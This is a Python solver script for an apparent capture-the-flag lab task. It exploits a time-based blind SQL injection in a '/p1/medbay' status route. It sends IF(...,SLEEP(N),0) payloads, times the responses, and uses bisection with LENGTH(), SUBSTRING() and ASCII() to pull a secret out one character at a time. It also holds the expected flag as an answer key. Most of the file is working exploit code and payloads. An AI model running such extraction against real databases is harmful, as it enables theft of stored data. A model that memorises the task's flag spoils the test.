#!/usr/bin/env python3
"""solvers/p1_5.py — Task 1.5 "Zevil Island Medical Bay" canonical exploit.

The status-lookup route builds its query with raw string concatenation:

    SELECT status FROM patients WHERE id='{id}'

and renders exactly one thing back, always: a fixed "status checked." log
line, whether the id matched a real patient, matched nothing, or made the
query outright error. Unlike p1_4's Silent Room (still one visible bit —
PASS or FAIL) there is no token at all here to read: the response body is
byte-for-byte identical no matter what happened server-side. The only
channel left is *how long* the request took — a conditional SLEEP() folded
into the injected condition via `IF(condition, SLEEP(N), 0)` makes a true
condition measurably slower than a false one, even though both produce the
exact same page.

This is a real, live extraction against the running stack — every
character below is recovered by actually timing the oracle, not hardcoded
or simulated. The expected flag is only used for the final assertion.
"""

from __future__ import annotations

import os
import sys
import time

import requests

BASE = os.environ.get("SEIYAKU_BASE", "http://localhost:8000")
EXPECTED_FLAG = "SEIYAKU{time_tells_all}"

# Generous upper bound so the walk doesn't depend on foreknowledge of the
# exact flag length/charset — just a plausible bound for a SEIYAKU{...} flag.
MAX_LEN = 64
ASCII_LOW = 32   # space
ASCII_HIGH = 126  # '~'

# --- timing tuning -----------------------------------------------------
# SLEEP_SECONDS is how long a *true* injected condition makes MariaDB
# pause via IF(condition, SLEEP(N), 0). THRESHOLD_SECONDS is the elapsed-
# time cutoff used to classify a response as "slow" (true) vs "fast"
# (false): comfortably above ordinary request latency (a few tens of ms
# on a local compose network) and comfortably below SLEEP_SECONDS, so a
# little jitter on a loaded sandbox can't flip the verdict. 1.2s sleep /
# 0.6s threshold gives roughly a 2x safety margin on both sides while
# keeping the ~23-char, ~7-bit-per-char bisection walk under a few
# minutes total.
SLEEP_SECONDS = 1.2
THRESHOLD_SECONDS = 0.6
REQUEST_TIMEOUT = SLEEP_SECONDS + 10

MARKER = "status checked"


def oracle(patient_id: str) -> tuple[bool, float]:
    """Send one injected `id` value, return (is_slow, elapsed_seconds).

    is_slow=True means the injected condition evaluated true (the SLEEP()
    fired); is_slow=False means it evaluated false (or the query errored —
    both read identically, fast). Anything that isn't a normal 200 with
    the expected marker text is treated as a hard failure of the solver
    itself, not folded into the boolean — that would silently corrupt the
    walk.
    """
    start = time.monotonic()
    resp = requests.get(
        f"{BASE}/p1/medbay", params={"id": patient_id}, timeout=REQUEST_TIMEOUT
    )
    elapsed = time.monotonic() - start
    resp.raise_for_status()
    if MARKER not in resp.text:
        raise RuntimeError(
            f"unexpected response shape for id={patient_id!r} — missing "
            f"marker text, response may no longer look like a silent "
            f"status-checked page"
        )
    return elapsed >= THRESHOLD_SECONDS, elapsed


def confirm_injection_and_silence() -> None:
    """Step 0: confirm the injection point exists, the response is truly
    silent (identical regardless of truth), and only timing differs.

    `' OR IF(1=1,SLEEP(N),0)-- -` forces the condition true (slow);
    `' OR IF(1=2,SLEEP(N),0)-- -` forces it false (fast). Both must render
    the exact same marker text — no PASS/FAIL, no error, nothing — and the
    only observable difference must be elapsed time.
    """
    print("[p1_5] step 0 — confirm injection point + silent (timing-only) oracle")

    true_payload = f"' OR IF(1=1,SLEEP({SLEEP_SECONDS}),0)-- -"
    slow, t_true = oracle(true_payload)
    print(f"  id={true_payload!r} -> {t_true:.3f}s ({'slow' if slow else 'fast'})")
    if not slow:
        raise RuntimeError(
            f"expected a slow (>= {THRESHOLD_SECONDS}s) response for an "
            f"always-true injected condition, got {t_true:.3f}s"
        )

    false_payload = f"' OR IF(1=2,SLEEP({SLEEP_SECONDS}),0)-- -"
    slow, t_false = oracle(false_payload)
    print(f"  id={false_payload!r} -> {t_false:.3f}s ({'slow' if slow else 'fast'})")
    if slow:
        raise RuntimeError(
            f"expected a fast (< {THRESHOLD_SECONDS}s) response for an "
            f"always-false injected condition, got {t_false:.3f}s"
        )

    # A deliberately malformed payload (unbalanced quote, no comment to
    # neutralize the trailing literal) must read as fast/silent too — not
    # as anything visibly or temporally different from an honest false.
    malformed_payload = f"' OR IF(1=1,SLEEP({SLEEP_SECONDS}),0)"
    slow, t_malformed = oracle(malformed_payload)
    print(
        f"  id={malformed_payload!r} (malformed) -> "
        f"{t_malformed:.3f}s ({'slow' if slow else 'fast'})"
    )
    if slow:
        raise RuntimeError("malformed query unexpectedly read as slow")

    print("  ok: oracle is genuinely time-blind (true/false/error render identically)")


def discover_length() -> int:
    """Binary-search the exact length of records.secret via LENGTH()."""
    lo, hi = 0, MAX_LEN
    while lo < hi:
        mid = (lo + hi + 1) // 2
        payload = (
            "' OR IF(LENGTH((SELECT secret FROM records LIMIT 1))>="
            f"{mid},SLEEP({SLEEP_SECONDS}),0)-- -"
        )
        slow, _ = oracle(payload)
        if slow:
            lo = mid
        else:
            hi = mid - 1
    return lo


def discover_char(position: int) -> str:
    """Binary-search the ASCII code of records.secret's char at `position`
    (1-indexed, matching SQL SUBSTRING semantics)."""
    lo, hi = ASCII_LOW, ASCII_HIGH
    while lo < hi:
        mid = (lo + hi + 1) // 2
        payload = (
            "' OR IF(ASCII(SUBSTRING((SELECT secret FROM records LIMIT 1),"
            f"{position},1))>={mid},SLEEP({SLEEP_SECONDS}),0)-- -"
        )
        slow, _ = oracle(payload)
        if slow:
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)


def main() -> int:
    print(f"[p1_5] target: {BASE}/p1/medbay")
    print(f"[p1_5] SLEEP={SLEEP_SECONDS}s, threshold={THRESHOLD_SECONDS}s")

    try:
        confirm_injection_and_silence()
    except Exception as exc:
        print(f"  FAIL: {exc}")
        print("[p1_5] FAIL")
        return 1

    print("[p1_5] step 1 — discover secret length via LENGTH() + timing bisection")
    try:
        length = discover_length()
    except Exception as exc:
        print(f"  FAIL: {exc}")
        print("[p1_5] FAIL")
        return 1
    print(f"  ok: LENGTH(records.secret) = {length}")
    if not (0 < length <= MAX_LEN):
        print(f"  FAIL: implausible length {length}")
        print("[p1_5] FAIL")
        return 1

    print("[p1_5] step 2 — walk the secret char-by-char via SUBSTRING()/ASCII() + timing bisection")
    chars: list[str] = []
    try:
        for pos in range(1, length + 1):
            c = discover_char(pos)
            chars.append(c)
            print(f"  position {pos:>2}: {c!r}  (so far: {''.join(chars)!r})")
    except Exception as exc:
        print(f"  FAIL: {exc}")
        print("[p1_5] FAIL")
        return 1

    recovered = "".join(chars)
    print(f"[p1_5] recovered secret: {recovered}")

    if recovered != EXPECTED_FLAG:
        print(f"  FAIL: recovered value does not match expected flag")
        print(f"  expected: {EXPECTED_FLAG}")
        print(f"  got:      {recovered}")
        print("[p1_5] FAIL")
        return 1

    print(f"  ok: recovered flag matches: {EXPECTED_FLAG}")
    print("[p1_5] PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
